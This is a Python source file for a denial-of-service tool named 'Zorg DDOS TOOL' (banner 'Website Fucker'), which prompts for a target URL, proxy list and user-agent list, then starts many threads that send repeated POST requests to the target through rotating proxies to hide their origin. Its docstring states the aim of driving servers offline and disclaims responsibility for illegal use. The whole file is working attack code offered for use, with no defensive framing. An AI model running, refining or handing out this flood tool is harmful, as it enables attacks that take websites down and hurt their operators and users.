import random

import requests
import threading
import pyfiglet
import urllib3.connection

"""

Zorg DDOS TOOL
by: U.A

I take no responsibility for the illegal use of this source code. The ZORG DDOS TOOL is a simple but efficient ddos tool. 
It floods the server with http requests from different proxies causing the ping to go up drastically and in many cases 
causes the server to go completely offline.

"""

loading_screen = pyfiglet.figlet_format("Website Fucker")
print(loading_screen)
print("By: UA")

p_ = []
ua = []
count = 0

proxy_file_loc = input("Enter the location of the proxy list: ")
header_agent_file_loc = input("Enter the location of the user agent list: ")
target_url = input("Enter the target url: ")
threading_num = input("Enter the threading number: ")
iteration_num = input("Enter the iteration number: ")

PROXIE_FILE_LOC = proxy_file_loc
TARGET_URL = target_url
THREADING_NUM = int(threading_num)
ITERATION_NUM = int(iteration_num)

file = " "

try:
    file = open(PROXIE_FILE_LOC, "r")
except FileNotFoundError:
    print(f"[ERROR]: The proxy file {PROXIE_FILE_LOC} cannot be found")
    exit(-1)

word: str = " "
d = 0



for f in file.read():
    if f == '\n':
        p_.append({"http": word})
        word = ""
    else:
        word = word + f


for x in p_:
    print(x)

word = " "

try:
    file = open(header_agent_file_loc, "r")
except FileNotFoundError:
    print(f"[ERROR]: The user agent file {header_agent_file_loc} cannot be found")

for f in file.read():
    if f == '\n':
        ua.append({word})
        word = ""
    else:
        word = word + f


s = requests.Session()
s.proxies = p_[random.randint(0, len(p_)-1)]

s.trust_env = False
s.headers = ua[0]

for x in ua:
    print(x)



class AttackThread(threading.Thread):
    def __init__(self, session: requests.Session, c: int):
        super(AttackThread, self).__init__()
        self.session = session
        self.total = 0
        self.count = c

    def run(self):
        try:
            count = 0
            d = 0
            for i in range(self.count):
                try:
                    rsp = self.session.post(TARGET_URL)
                    count += 1
                    self.session.proxies = p_[random.randint(0, len(p_) - 1)]
                    self.session.headers = ua[random.randint(0, len(ua) - 1)]
                    print("\n")
                    print(f"Count: [{count}], rsp:{rsp}, Loc: {p_[d]}")
                except: pass


        except urllib3.connection.NewConnectionError:
            print(f"[LOG]: {TARGET_URL} is not responding.. it is probably down\n")
        except urllib3.connection.HTTPConnection:
            print(f"[LOG]: {TARGET_URL} is not responding.. it is probably down\n")


threads = [AttackThread(s, ITERATION_NUM) for _ in range(THREADING_NUM)]

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
